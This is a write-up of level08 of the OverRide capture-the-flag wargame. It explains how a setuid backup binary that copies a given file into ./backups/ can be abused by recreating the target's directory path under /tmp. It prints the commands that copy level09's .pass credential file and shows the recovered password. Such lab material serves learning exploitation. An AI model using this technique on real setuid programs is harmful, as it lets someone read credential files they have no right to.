# Walkthrough

## Context

### Binary info

```bash
level08@OverRide:~$ ls -l
total 16
drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
level08@OverRide:~$ file level08
level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped
level08@OverRide:~$ ls -lR backups/
backups/:
total 0
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 filename
ERROR: Failed to open filename
```

An elf binary compiled for x86-64 arch with level09's privileges

### Functions

```assembly
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x00000000004008c4  log_wrapper
0x00000000004009f0  main
...
```

### Variables

```assembly
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
```

No global variables

### Disassembly

Please refer to the [source.c](./source.c) and [assembly.asm](Resources/assembly.asm) for details

The only thing we should look is source.c file really

## Exploit

As we saw in source.c file the program tries to open ./backups/.tmp for write, argv[1] for read and then, with the exact same path as argv1 tries to open file inside ./backups/

We know that the program has level09's privileges so it has now problem to open the .pass file of the level09's user. So what's stopping us to just mocking the file structure to satisfy the program and just read backed up .pass? Nothing!

### Getting .pass

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Well that was too easy i guess?
